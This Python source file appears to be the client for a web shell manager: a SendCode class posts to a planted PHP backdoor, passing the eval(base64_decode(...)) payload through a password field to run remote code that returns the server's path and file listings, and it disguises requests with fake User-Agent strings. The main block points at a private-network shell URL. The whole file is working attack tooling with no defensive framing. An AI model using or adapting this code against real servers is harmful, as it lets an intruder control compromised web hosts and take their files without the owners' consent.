import requests
from nife.core.phpCodeFun import getFilelistBase, getFilePathBase
from nife.core.fakeUseAgent import fake_agent
import json
from lxml import etree


class SendCode(object):

    def __init__(self, url, pwd):
        self.url = url
        self.pwd = pwd
        self.data = dict()
        self.data[pwd]="@eval(base64_decode($_POST[ek]));"
        self.data["ek"] = ""
        self.r = requests.session()


    def getFilePath(self):
        self.data["ek"] = getFilePathBase()
        header = {
            "User-Agent": fake_agent()
        }
        res = self.r.post(url=self.url, data=self.data, headers=header)
        page = etree.HTML(res.text)
        val = page.xpath('//ek/text()')[0]
        path = json.loads(val)['path']
        if '\\' in path:
            path = path.replace('\\', "/")
        return path

    def getFilelist(self, path):
        self.data["ek"] = getFilelistBase(path=path)
        header = {
            "User-Agent": fake_agent()
        }
        res = self.r.post(url=self.url, data=self.data, headers=header)
        page = etree.HTML(res.text)
        val = page.xpath('//ek/text()')[0]
        file_list = json.loads(val)
        return file_list

if __name__ == '__main__':
    # s = SendCode("http://172.28.100.13/PhpstormProjects/Cnife/eval_fun.php", 'cmd')
    s = SendCode("http://172.28.100.60/nife.php", 'cmd')
    path = s.getFilePath()
    print(path)
    # val = s.getFilelist(path=path)
    # print(len(val))